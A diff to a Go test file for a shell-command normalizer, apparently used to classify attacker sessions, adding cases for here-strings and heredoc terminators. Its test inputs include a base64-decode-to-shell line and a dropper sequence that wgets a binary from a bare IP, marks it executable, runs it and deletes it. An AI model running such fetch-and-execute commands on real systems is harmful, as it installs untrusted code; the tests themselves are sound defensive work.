@@ -123,6 +123,11 @@ func TestHeredocAndWrappers(t *testing.T) {
 		{`nohup python3 x`, `nohup python3 x`},
 		{`sudo base64 -d f`, `sudo base64 -d f`},
 		{`x=1 md5sum f`, `x=1 md5sum f`},
+		// Here-strings must not trigger heredoc mode
+		{`base64 -d <<< "Zm9v" | sh`, `base64 -d <<< <tok> | sh`},
+		{"base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x", `base64 -d <<< <tok> | sh ; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm x`},
+		// Heredoc terminator must be exact line match, not just prefix
+		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc> ; id`},
 	} {
 		if got := norm(tc.in); got != tc.want {
 			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
@@ -136,5 +141,18 @@ func TestHeredocAndWrappers(t *testing.T) {
 	}
 	if !Distinctive([][]string{NormalizeCommand("sudo wget http://x/y; nohup ./y; id; w; ls")}) {
 		t.Error("wget behind sudo must count as a non-recon program")
+	}
+	// Here-strings must survive and be counted correctly
+	// Note: CommandCount includes segments split by pipe, so base64|sh = 2, plus cd, wget, chmod, ./x, rm = 5, total = 7
+	hereStringCmd := "base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x"
+	if n := CommandCount([][]string{NormalizeCommand(hereStringCmd)}); n != 7 {
+		t.Errorf("here-string CommandCount = %d, want 7", n)
+	}
+	if !Distinctive([][]string{NormalizeCommand(hereStringCmd)}) {
+		t.Error("here-string multi-command must be distinctive")
+	}
+	// Heredoc with trailing text after delimiter must continue
+	if n := CommandCount([][]string{NormalizeCommand("cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid")}); n != 2 {
+		t.Errorf("heredoc with trailing delimiter CommandCount = %d, want 2", n)
 	}
 }
